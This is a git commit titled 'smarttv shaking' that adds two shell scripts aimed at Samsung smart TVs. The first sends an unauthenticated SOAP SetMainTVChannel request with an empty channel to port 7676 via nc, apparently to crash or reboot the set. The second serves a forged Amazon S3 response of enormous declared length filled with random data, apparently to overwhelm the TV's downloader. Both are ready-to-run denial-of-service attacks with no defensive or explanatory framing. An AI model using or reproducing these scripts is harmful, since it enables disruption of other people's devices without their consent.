79aa8b150306677a09b95cc042fd60857d6a63ff
mboldyrev <mikael-1994@yandex.ru>
2016-12-03 13:06:28 +0300

    smarttv shaking

---
+++ android/smarttv/reboot.sh
@@ -0,0 +1,14 @@
+ip=$1
+[ x${ip} == x ] && exit 1
+
+echo 'POST /smp_4_ HTTP/1.1
+Host: ' $ip '
+SOAPAction: "urn:samsung.com:service:MainTVAgent2:1#SetMainTVChannel"
+Accept-Language: en-us;q=1, en;q=0.5
+Accept-Encoding: gzip
+Content-Type: text/xml; charset="utf-8"
+User-Agent: gupnp-universal-cp GUPnP/0.20.18 DLNADOC/1.50
+Connection: Keep-Alive
+Content-Length: 348
+
+<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:SetMainTVChannel xmlns:u="urn:samsung.com:service:MainTVAgent2:1"><Channel></Channel><SatelliteID>0</SatelliteID><ChannelListType>0</ChannelListType></u:SetMainTVChannel></s:Body></s:Envelope>' | nc $ip 7676
---
+++ android/smarttv/server.sh
@@ -0,0 +1,20 @@
+(
+    cat <<EOF
+HTTP/1.1 200 OK
+x-amz-id-2: 9Nugr1iLITqHHJXzBeCTLimys5TeanKwuEre92HoHb3+xZaLgM/SR/pPVnd1nrsaTG9BqzOpFjU=
+x-amz-request-id: 5F706284E2A18893
+Last-Modified: Fri, 17 Jun 2016 05:08:12 GMT
+ETag: "7078cd7e79632ef2556b4f1ba696599c-8"
+Accept-Ranges: bytes
+Content-Type: binary/octet-stream
+Content-Length: 99953714944
+Server: AmazonS3
+Expires: Fri, 02 Dec 2016 19:08:11 GMT
+Cache-Control: max-age=0, no-cache
+Pragma: no-cache
+Date: Fri, 02 Dec 2016 19:08:11 GMT
+Connection: keep-alive
+
+EOF
+dd if=/dev/urandom bs=1M count=2048
+) | sudo nc -lp 80
